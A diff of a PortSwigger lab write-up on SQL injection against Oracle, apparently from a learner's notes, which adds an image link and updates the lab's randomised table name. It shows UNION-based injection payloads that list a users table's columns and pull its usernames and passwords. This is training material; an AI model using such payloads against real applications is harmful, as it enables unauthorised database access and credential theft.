@@ -51,7 +51,7 @@ We get a list of all the tables,
 
 The table which we are interested in is this 
 
-![image]()
+![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/d5407478db6479f8aab1e6589e32a1d553457608/SQL-Injection/Lab%3A%20SQL%20injection%20attack%2C%20listing%20the%20database%20contents%20on%20Oracle/Images/Table%20Name.png)
 
 
 #### List all columns -
@@ -59,7 +59,7 @@ The table which we are interested in is this
 We can list all the columns by querying `SELECT * FROM all_tab_columns WHERE table_name = 'USERS'`
 
 ```sql
-SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS_UHYHRO'--
+SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS_MVMNFH'--
 ```
 
 ![image]()
@@ -69,7 +69,7 @@ SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT column_name,N
 
 
 ```sql
-SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT USERNAME_YNHYHK,PASSWORD_LFRJHB FROM USERS_UHYHRO--
+SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT USERNAME_YNHYHK,PASSWORD_LFRJHB FROM USERS_MVMNFH--
 ```
 
 ![image]()
